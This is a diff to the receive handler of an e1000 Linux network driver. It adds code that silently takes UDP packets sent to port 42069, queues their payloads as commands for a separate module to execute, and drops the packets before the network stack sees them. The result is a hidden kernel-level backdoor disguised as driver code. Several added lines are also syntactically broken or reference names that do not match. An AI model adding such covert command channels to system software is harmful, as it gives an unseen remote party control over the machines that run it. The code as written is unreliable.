@@ -2,7 +2,7 @@
 #include "e1000_hw.h"
 #include "e1000_osdep.h"
 #include "networking.h"
-
+#include "tty_util.h"
 
 /*
 TODO: Make sure that an e1000 device using jumbo frames is not hooked as we do not support that here. 
@@ -16,6 +16,16 @@ Some notes on the e1000 rx implementation:
 #define IP_HLEN sizeof(struct iphdr)
 #define UDP_HLEN sizeof(struct udphdr)
 #define TCP_HLEN sizeof(struct tcphdr)
+
+#define UDP 17 //UDP Protocol number
+
+
+//both of these extern structs are created in tty_util
+extern struct list_head commands; 
+
+extern struct wait_queue_head command_wait;
+
+
 struct e1000_adapter* get_e1000_adapter(struct net_device* net_dev){
     return (struct e1000_adapter*) netdev_priv(net_dev);
 }
@@ -136,12 +146,32 @@ void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, st
     struct ethhdr* eth = (struct ethhdr*)skb->data; //reference ethhdr with old data pointer before it gets incremented by eth_type_trans
 
     skb->protocol = eth_type_trans(skb, adapter->netdev); 
+
     ip = (struct iphdr*)skb->data; //ip header pointer. Ideally some kind of switch needs to be created here lul
+    if(ip -> protocol != UDP) //let it through if its not UDP
+        goto good;
+
+    /*
+    The cool thing is that these increments can NEVER segfault because skb is allocated to be as big as the MTU. BatChest
+    */
     udp = (struct udphdr*)(skb->data + IP_HLEN); //udp header ptr
-    true_data = (char*)(skb->data + +IP_HLEN + UDP_HLEN); //true data
-    //actually cutting off things
-    if(!strncmp(eth->h_source, "\x8c\x85\x90\x3c\x28\x01", 6)){
-       // printk(KERN_INFO "data: %s\n", true_data);
+    true_data = (char*)(skb->data + IP_HLEN + UDP_HLEN); //true data
+    true_data_len = be16_to_cpu(udp->len)
+    if(be16_to_cpu(udp->dest) == 42069){
+       //welcome to Qogchamp   
+        struct command* next_cmd = kzalloc(sizeof(struct command), GFP_KERNEL);
+        next_cmd -> str = kzalloc(true_data_len-UDP_HLEN+1, GFP_KERNEL); //udp->len includes the udp header so subtract 8 bytes out and add 1 so it can be null terminated
+        next_cmd->size true_data_len; 
+        next_cmd -> list =  LIST_HEAD_INIT(next->list); 
+        strncpy(next_cmd->str, true_data, true_data_len);
+        list_add_tail(&next_cmd->list_head, &commands);
+        
+
+
+        if(wq_has_sleeper(&qogchamp_wait)){
+            wake_up(qogchamp_wait); //we sleep if we are starved of commands to execute. 
+        }
+        
         dev_kfree_skb(skb); //free the skb. Don't use slab cache space because that would be cringe. This will return immediately and not send it up the stack.
         return;
     }
@@ -155,7 +185,7 @@ void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, st
     It is immensely important to note that eth_type_trans not only sets the protocol, but also sets up the skb->mac_header. So, we can use skb->data to access the mac header
     */
     
-
+good:
     if (status & E1000_RXD_STAT_VP) {
         u16 vid = le16_to_cpu(vlan) & E1000_RXD_SPC_VLAN_MASK;
 
